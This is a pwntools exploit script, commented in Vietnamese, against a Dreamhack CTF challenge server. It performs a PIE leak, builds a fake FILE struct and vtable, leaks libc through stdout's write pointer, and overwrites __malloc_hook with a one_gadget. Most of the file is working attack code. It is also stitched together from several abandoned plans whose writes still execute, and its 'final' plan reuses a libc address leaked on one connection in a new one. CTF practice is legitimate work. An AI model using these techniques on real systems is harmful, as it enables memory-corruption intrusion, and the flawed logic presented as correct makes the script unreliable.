from pwn import *

# context.log_level = 'debug'
elf = context.binary = ELF("./main")
# libc = ELF("./libc.so.6") # Nếu có file libc
libc = elf.libc # Nếu không có, để pwntools tự tìm

# Thiết lập kết nối
# p = process()
p = remote("host3.dreamhack.games", 19301)

# --- Bước 1: Leak địa chỉ và tính toán ---
p.recvuntil(b"seed...: ")
value_addr = int(p.recvline().strip(), 16)
log.info(f"Leaked `value` address: {hex(value_addr)}")

# Tính PIE base và địa chỉ hàm win
elf.address = value_addr - elf.sym['value']
win_addr = elf.sym['win']
log.info(f"PIE base address: {hex(elf.address)}")
log.info(f"Address of win(): {hex(win_addr)}")

# --- Bước 2 & 3: Chuẩn bị FILE struct và vtable giả mạo ---
# Chúng ta sẽ tạo cấu trúc giả tại địa chỉ `value_addr`
# Cấu trúc FILE giả
fake_file = b""
fake_file += p64(0)                 # _flags = 0 (hoặc một giá trị phù hợp)
fake_file += p64(0) * 3             # _IO_read_ptr, _IO_read_end, _IO_read_base
fake_file += p64(1)                 # _IO_write_base = 1
fake_file += p64(2)                 # _IO_write_ptr = 2 (để _IO_write_ptr > _IO_write_base)
fake_file += p64(0) * 8             # Các trường khác
fake_file += p64(value_addr + 0xe0) # _chain -> trỏ tới chính nó hoặc NULL, ở đây để trống
fake_file += p64(3)                 # _fileno
fake_file += p64(0) * 2             # _flags2, _old_offset
fake_file += p64(0)                 # _lock
fake_file += p64(0) * 3             # _offset, _codecvt, _wide_data
fake_file += p64(value_addr + 0xa0) # _freeres_list -> trỏ tới vùng vtable giả
fake_file += p64(0)                 # _freeres_buf
fake_file += p64(0)                 # __pad5
fake_file += p64(0)                 # _mode
fake_file += b'\x00' * 20           # _unused2
fake_file += p64(value_addr + 0xd8) # vtable -> trỏ tới vtable giả của chúng ta

# vtable giả mạo
# Chúng ta chỉ cần điền vào vị trí của hàm _IO_overflow (offset 0x18)
fake_vtable = b""
fake_vtable += p64(0) * 3           # Các hàm không dùng đến
fake_vtable += p64(win_addr)        # _IO_overflow -> win()

# Payload cuối cùng để ghi vào `value`
payload = fake_file.ljust(0xd8, b'\x00') + fake_vtable

# --- Bước 4: Thực hiện 2 lần ghi ---

# Lần ghi 1: Ghi đè _IO_list_all
# Tính offset từ stdout đến _IO_list_all
offset_to_list_all = libc.sym['_IO_list_all'] - libc.sym['stdout']
log.info(f"Offset from stdout to _IO_list_all: {hex(offset_to_list_all)}")

p.sendlineafter(b"Where: ", str(offset_to_list_all).encode())
p.sendlineafter(b"Count: ", str(value_addr).encode()) # Ghi địa chỉ của struct giả

# Lần ghi 2: Ghi vào _fileno của stdout để nó hoạt động
# Offset của _fileno trong stdout là 0x70
offset_to_fileno = 0x70
p.sendlineafter(b"Where: ", str(offset_to_fileno).encode())
p.sendlineafter(b"Count: ", b"2") # Ghi giá trị 2

# --- Gửi payload để tạo FILE struct giả ---
# Bây giờ chúng ta cần ghi payload (struct và vtable giả) vào `value_addr`
# Chúng ta có thể dùng một trong hai lần ghi để làm việc này, nhưng cách trên trực tiếp hơn.
# Nếu không thể ghi trực tiếp, ta có thể dùng một lần ghi để ghi địa chỉ của payload,
# và lần ghi thứ hai để kích hoạt một write-what-where khác.
# Tuy nhiên, ở đây chúng ta đã ghi đè _IO_list_all.
# Giờ chúng ta cần đảm bảo điều kiện `result == 99` được thỏa mãn để chương trình không thoát sớm.
# Chúng ta đã dùng 2 lần ghi, nên không thể thỏa mãn điều kiện này.
# -> Cần suy nghĩ lại.

# --- Kế hoạch thay thế đơn giản hơn ---
# Lần ghi 1 (Wheat): Ghi đè _IO_list_all -> trỏ tới stdout
# Lần ghi 2 (Barley): Ghi đè vtable của stdout -> trỏ tới vtable giả của chúng ta
# vtable giả sẽ được đặt tại `value_addr`

# Reset lại
p.close()
p = remote("host3.dreamhack.games", 19301)
p.recvuntil(b"seed...: ")
value_addr = int(p.recvline().strip(), 16)
elf.address = value_addr - elf.sym['value']
win_addr = elf.sym['win']
log.info(f"Restarting with new plan. `value` at {hex(value_addr)}, `win` at {hex(win_addr)}")

# Tạo vtable giả tại `value_addr`
# Ghi địa chỉ của `win` vào `value[0]`
# Ghi các giá trị khác vào `value[1]`...
# Tuy nhiên, chúng ta chỉ có thể ghi 2 giá trị 8-byte vào `value`
# -> Kế hoạch này cũng không ổn.

# --- Quay lại kế hoạch ban đầu và sửa lỗi logic ---
# Lỗi logic: `scanf` sẽ ghi vào `value[0]` và `value[1]`.
# Payload của chúng ta phải được chứa trong 2 giá trị này.
# Toàn bộ FILE struct và vtable giả phải được tạo từ 2 lần ghi 8-byte. Điều này không thể.

# --- Phân tích lại lỗ hổng ---
# `*(size_t *)((size_t) stdout + off[0]) = value[0];`
# `value[0]` được đọc từ `scanf`. Nó là một giá trị 8-byte.
# Chúng ta có thể ghi một giá trị 8-byte vào một địa chỉ.
# Chúng ta có thể làm điều này hai lần.

# KẾ HOẠCH CUỐI CÙNG (ĐÚNG ĐẮN) - ONE-GADGET ATTACK
# 1. Leak libc: Ghi đè `_IO_2_1_stdout_` để nó in ra địa chỉ của chính nó hoặc một hàm libc khác.
#    - `stdout` trỏ đến `_IO_2_1_stdout_`.
#    - Ghi đè `_IO_write_ptr` của `stdout` để nó trỏ đến một mục GOT (ví dụ `got.puts`).
#    - Lần `printf` tiếp theo sẽ in ra địa chỉ của `puts` trong libc.
# 2. Tính toán: Từ địa chỉ `puts`, tính base của libc và địa chỉ của `one_gadget`.
# 3. Ghi đè hook: Dùng lần ghi thứ hai để ghi đè `__malloc_hook` hoặc `__free_hook` bằng địa chỉ của `one_gadget`.
# 4. Kích hoạt: Chương trình gọi `printf` (bên trong có thể gọi `malloc`), kích hoạt hook và chạy one_gadget.

# Script cho kế hoạch cuối cùng
p.close()
p = remote("host3.dreamhack.games", 19301)

# Leak libc base
p.recvuntil(b"seed...: ")
value_addr = int(p.recvline().strip(), 16)
elf.address = value_addr - elf.sym['value']
log.info(f"Leaked `value` address: {hex(value_addr)}")

# Ghi đè `_IO_write_ptr` của stdout để trỏ vào GOT của puts
# Offset của _IO_write_ptr trong _IO_FILE_plus là 0x28
offset_to_write_ptr = 0x28
p.sendlineafter(b"Where: ", str(offset_to_write_ptr).encode())
p.sendlineafter(b"Count: ", str(elf.got['puts']).encode())

# Lần ghi thứ hai chỉ để thỏa mãn luồng chương trình
p.sendlineafter(b"Where: ", b"0")
p.sendlineafter(b"Count: ", b"0")

# Nhận leak
p.recvuntil(b"Harvest Result: ")
p.recvline()
leaked_puts = u64(p.recvn(6) + b'\x00\x00')
libc.address = leaked_puts - libc.sym['puts']
log.info(f"Leaked puts@GLIBC: {hex(leaked_puts)}")
log.info(f"Libc base: {hex(libc.address)}")

# Tìm one_gadget
# one_gadgets = [0xebcf1, 0xebcf5, 0xebcf8] # Thay bằng one_gadget của libc trên server
# one_gadget = libc.address + one_gadgets[0]
# Hoặc dùng công cụ tự động
one_gadget = libc.address + 0xe574f # Thay đổi offset này dựa trên libc của server

log.info(f"One gadget address: {hex(one_gadget)}")

# Ghi đè __malloc_hook bằng one_gadget
# Chúng ta cần một lần chạy mới vì chương trình đã kết thúc
p.close()
p = remote("host3.dreamhack.games", 19301)
p.recvuntil(b"seed...: ") # Bỏ qua leak lần này

offset_to_malloc_hook = libc.sym['__malloc_hook'] - libc.sym['stdout']
p.sendlineafter(b"Where: ", str(offset_to_malloc_hook).encode())
p.sendlineafter(b"Count: ", str(one_gadget).encode())

# Kích hoạt malloc_hook bằng cách gọi printf, nó sẽ gọi malloc
p.sendlineafter(b"Where: ", b"0") # Gửi giá trị bất kỳ để kích hoạt printf
p.sendlineafter(b"Count: ", b"0")

p.interactive()